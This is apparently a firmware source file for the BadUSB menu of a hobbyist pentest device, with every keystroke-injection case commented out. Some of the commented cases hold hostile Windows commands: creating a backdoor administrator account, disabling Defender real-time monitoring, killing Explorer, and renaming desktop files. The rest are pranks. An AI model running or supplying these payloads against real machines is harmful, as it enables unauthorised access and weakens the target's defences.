#include "globals.h"











void handlebadusbmenu() {
  // const char* menuItems[] = {
  //   "DEMO",
  //  "KEYBOARD",
  //  "HID SCRIPT",
  //  "Open Notepad",
  // "Open CMD",
  // "Show IP",
  // "Shutdown",
  // "RickRoll",
  // "Create Admin",
  // "Disable Defender",
  // "Open YouTube",
  // "Lock PC",
  // "Fake Update",
  // "Endless Notepad",
  // "Fake BSOD",
  // "Flip Screen",
  // "Matrix Effect",
  // "I'm Watching U",
  // "Open Google",
  // "Open telegram",
  // "Play Alarm Sound",
  // "Endless CMD",
  // "Type Gibberish",
  // "Spam CAPSLOCK",
  // "Open Calc",
  // "Auto 'Hacked!'",
  // "Turn Off Monitor",
  // "Open RegEdit",
  // "Kill Explorer",
  // "Flash Screen",
  // "Rename Desktop",
  // "Toggle WiFi",
  // "Auto Screenshot",
  // "Spam Emojis",
  // "Open Ctrl Panel",
  // "Troll Wallpaper",
  // "Open MS Paint",
  // "Tab Switcher"
  //   };
  // if (millis() - lastInputTime > 150) {
    

  // if (digitalRead(BTN_UP) == LOW) {
  //   selectedItem--;
  //   if (selectedItem < 0) selectedItem = menuLength - 1;
  //   scrollOffset = constrain(selectedItem - visibleItems + 1, 0, menuLength - visibleItems);
  //   lastInputTime = millis(); // ✅ حدثنا الوقت بعد الضغط
  // }

  // if (digitalRead(BTN_DOWN) == LOW) {
  //   selectedItem++;
  //   if (selectedItem >= menuLength) selectedItem = 0;
  //   scrollOffset = constrain(selectedItem - visibleItems + 1, 0, menuLength - visibleItems);
  //   lastInputTime = millis(); // ✅ حدثنا الوقت بعد الضغط
  // }

  // if (digitalRead(BTN_SELECT) == LOW) {
  //   switch (selectedItem) {

  //     case 0: //demo

  //     showRunningScreen("DEMO");
      

  // // Keyboard.press(KEY_LEFT_GUI);
  // // Keyboard.press('r');
  // // Keyboard.releaseAll();
  // // delay(1000);

  // // Keyboard.println("notepad");
  // // delay(1500);

  // delay(2000);

  // // Keyboard.println("");
  // // Keyboard.println("██╗  ██╗██╗███████╗███╗   ███╗ ██████╗ ███████╗");
  // // Keyboard.println("██║  ██║██║     ██╝████╗ ████║██╔═══██╗██╔════╝");
  // // Keyboard.println("███████║██║  ███╗  ██╔████╔██║██║   ██║███████╗");
  // // Keyboard.println("██╔══██║██║██╔══╝  ██║╚██╔╝██║██║   ██║╚════██║");
  // // Keyboard.println("██║  ██║██║███████╗██║ ╚═╝ ██║╚██████╔╝███████║");
  // // Keyboard.println("╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝");
  // // Keyboard.println("");
  // // Keyboard.println("         — CREATED BY HIKTRON —");
  // // Keyboard.println("- HIZMOS IS A FLIPPER ZERO REPLICA 'OPEN SOURCE' -");
  // // Keyboard.println("");
  // // Keyboard.println(".......... DEVELOPERS ..........");
  // // Keyboard.println("{ YOUSSEF I HIKAL && OMAR KAMEL }");
  // // Keyboard.println("");
  // // Keyboard.println("     \"\"\" MULTI TOOL DEVICE \"\"\"");
  // // Keyboard.println("");
  // // Keyboard.println("<FOR>");
  // // Keyboard.println("[*PENTESTERS & EMBED ENGINEERS*]");
  // // Keyboard.println("[*HOBBYIST , CYBER SECURITY EXPERTS*]");
  // // Keyboard.println("");
  // // Keyboard.println("#-FEATURES:");
  // // Keyboard.println("1- WIFI ATTACKS");
  // // Keyboard.println("2- BLE ATTACKS");
  // // Keyboard.println("3- BAD USB");
  // // Keyboard.println("4- NFC");
  // // Keyboard.println("5- INFRARED");
  // // Keyboard.println("6- SUB-GHZ");
  // // Keyboard.println("7- GPIO");
  // // Keyboard.println("8- APPS");
  // // Keyboard.println("9- SETTINGS");
  // // Keyboard.println("10- FILES");


      
  //     break;
  //    case 1: // keyboard
  //     runLoop(hidkeyboard);
  //     break;
  //    case 2: // saved scripts
  //    hidInit();
  //    runLoop(hidscriptmenu);
    
  //     break;


  //     case 3: // Open Notepad

  //     showRunningScreen("notepad");
  //     runCommand("notepad");
  //     break;
  //   case 4: // Open CMD
  //      showRunningScreen("opening cmd");
  //     runCommand("cmd");
  //     break;
  //   case 5: // Show IP
  //     showRunningScreen("Getting IP");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("ipconfig");
  //     Keyboard.write(KEY_RETURN);
  //     break;
  //   case 6: // Shutdown
  //   showRunningScreen("shutdown");
  //     runCommand("shutdown /s /t 0");
  //     break;
  //   case 7: // RickRoll
  //   showRunningScreen("rickroll");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  //     Keyboard.write(KEY_RETURN);
  //     break;
  //   case 8: // Create Admin User
  //   showRunningScreen("create admin user");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("net user hacker 1234 /add");
  //     Keyboard.write(KEY_RETURN);
  //     delay(300);
  //     Keyboard.print("net localgroup administrators hacker /add");
  //     Keyboard.write(KEY_RETURN);
  //     break;
  //   case 9: // Disable Windows Defender
  //   showRunningScreen("disable windoes defender");
  //     runCommand("powershell");
  //     delay(500);
  //     Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  //     Keyboard.write(KEY_RETURN);
  //     break;
  //   case 10: // Open YouTube
  //   showRunningScreen("youtube");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://www.youtube.com");
  //     Keyboard.write(KEY_RETURN);
  //     break;
  //   case 11: // Lock PC
  //   showRunningScreen("lock pc");
  //     runCommand("rundll32.exe user32.dll,LockWorkStation");
  //     break;
  //   case 12: // Fake Update
  //   showRunningScreen("fake update");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://fakeupdate.net/win10u/");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //         case 13: // Endless Notepad
  //         showRunningScreen("endless notepad");
  //     for (int i = 0; i < 10; i++) {
  //       runCommand("notepad");
  //       delay(500);
  //     }
  //     break;

  //   case 14: // Fake BSOD (opens fullscreen image)
  //   showRunningScreen(" fake bsod");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://fakeupdate.net/bsod/");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 15: // Flip screen
  //   showRunningScreen("Flip screen");
  //     Keyboard.press(KEY_LEFT_CTRL);
  //     Keyboard.press(KEY_LEFT_ALT);
  //     Keyboard.press(KEY_DOWN_ARROW);
  //     delay(100);
  //     Keyboard.releaseAll();
  //     break;

  //   case 16: // Matrix effect
  //   showRunningScreen("Matrix effect");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("color 0A");
  //     Keyboard.write(KEY_RETURN);
  //     Keyboard.print(":a");
  //     Keyboard.write(KEY_RETURN);
  //     Keyboard.print("echo %random%%random%%random%%random%");
  //     Keyboard.write(KEY_RETURN);
  //     Keyboard.print("goto a");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 17: // I'm watching you prank
  //   showRunningScreen(" iam watching you");
  //     for (int i = 0; i < 5; i++) {
  //       runCommand("notepad");
  //       delay(1000);
  //       Keyboard.print("I'm watching you...");
  //       delay(5000);
  //     }
  //     break;

  //         case 18: // Open Google
  //         showRunningScreen("open google");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://www.google.com");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 19: // Open telegram
  //   showRunningScreen("open telegram");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://web.telegram.org/");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 20: // Alarm Sound
  //   showRunningScreen("alarm sound");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://www.soundjay.com/button/beep-07.wav");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 21: // Endless CMD
  //   showRunningScreen("endless smd");
  //     for (int i = 0; i < 20; i++) {
  //       runCommand("cmd");
  //       delay(300);
  //     }
  //     break;

  //   case 22: // Gibberish
  //   showRunningScreen("gibberish");
  //     for (int i = 0; i < 100; i++) {
  //       char c = random(33, 127);
  //       Keyboard.write(c);
  //       delay(50);
  //     }
  //     break;

  //   case 23: // CAPSLOCK Spam
  //   showRunningScreen("caps lock spam");
  //     for (int i = 0; i < 10; i++) {
  //       Keyboard.press(KEY_CAPS_LOCK);
  //       delay(200);
  //       Keyboard.release(KEY_CAPS_LOCK);
  //       delay(200);
  //     }
  //     break;

  //   case 24: // Calculator
  //   showRunningScreen("claculator");
  //     runCommand("calc");
  //     break;

  //   case 25: // Auto Type "Hacked!"
  //   showRunningScreen("hacked");
  //     for (int i = 0; i < 5; i++) {
  //       Keyboard.print("Hacked!");
  //       Keyboard.write(KEY_RETURN);
  //       delay(1000);
  //     }
  //     break;

  //   case 26: // Turn off monitor (Windows only)
  //   showRunningScreen("turn off monitor");
  //     runCommand("powershell");
  //     delay(500);
  //     Keyboard.print("(Add-Type '[DllImport(\"user32.dll\")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 27: // RegEdit
  //   showRunningScreen("regedit");
  //     runCommand("regedit");
  //     break;

  //   case 28: // Kill Explorer
  //   showRunningScreen(" kill explorer");
  //     runCommand("taskkill /f /im explorer.exe");
  //     break;

  //   case 29: // Flash screen (by changing background rapidly)
  //   showRunningScreen(" flash screen");
  //     for (int i = 0; i < 10; i++) {
  //       runCommand("color 4F");
  //       delay(200);
  //       runCommand("color 1F");
  //       delay(200);
  //     }
  //     break;

  //   case 30: // Rename Desktop Files (basic prank)

  //   showRunningScreen("rename desktop files");
  //     runCommand("powershell");
  //     delay(500);
  //     Keyboard.print("Get-ChildItem \"$env:USERPROFILE\\Desktop\" | Rename-Item -NewName {'hacked'+$_.Name}");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 31: // Toggle WiFi (requires admin)
  //   showRunningScreen("toggle wifi");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("netsh interface set interface Wi-Fi disabled");
  //     Keyboard.write(KEY_RETURN);
  //     delay(1000);
  //     Keyboard.print("netsh interface set interface Wi-Fi enabled");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 32: // Screenshot
  //   showRunningScreen("screenshot");
  // runCommand("powershell");
  // delay(500);
  // Keyboard.print("Add-Type -AssemblyName System.Windows.Forms;");
  // Keyboard.write(KEY_RETURN);
  // delay(300);
  // Keyboard.print("[System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')");
  // Keyboard.write(KEY_RETURN);
  // break;


  //   case 33: // Emoji spam
  //   showRunningScreen("emoji spam");
  //     for (int i = 0; i < 10; i++) {
  //       Keyboard.print("😂💀🔥");
  //       Keyboard.write(KEY_RETURN);
  //       delay(500);
  //     }
  //     break;

  //   case 34: // Control Panel
  //   showRunningScreen("control panel");
  //     runCommand("control");
  //     break;

  //   case 35: // Troll wallpaper
  //   showRunningScreen("troll wallpaper");
  //     runCommand("cmd");
  //     delay(500);
  //     Keyboard.print("start https://i.imgur.com/trollface.png");
  //     Keyboard.write(KEY_RETURN);
  //     break;

  //   case 36: // MS Paint
  //   showRunningScreen("ms paint");
  //     runCommand("mspaint");
  //     break;

  //   case 37: // Auto Tab Switcher
  //   showRunningScreen(" auto tab switcher");
  //     for (int i = 0; i < 10; i++) {
  //       Keyboard.press(KEY_LEFT_CTRL);
  //       Keyboard.press(KEY_TAB);
  //       delay(100);
  //       Keyboard.releaseAll();
  //       delay(300);
  //     }
  //     break;
  //   }
  //   lastInputTime = millis(); // ✅ حدثنا الوقت بعد الضغط
  // }
  // }

  
}







// void runCommand(const char* command) {
//   Keyboard.press(KEY_LEFT_GUI);
//   Keyboard.press('r');
//   delay(100);
//   Keyboard.releaseAll();
//   delay(300);
//   Keyboard.print(command);
//   Keyboard.write(KEY_RETURN);
// }





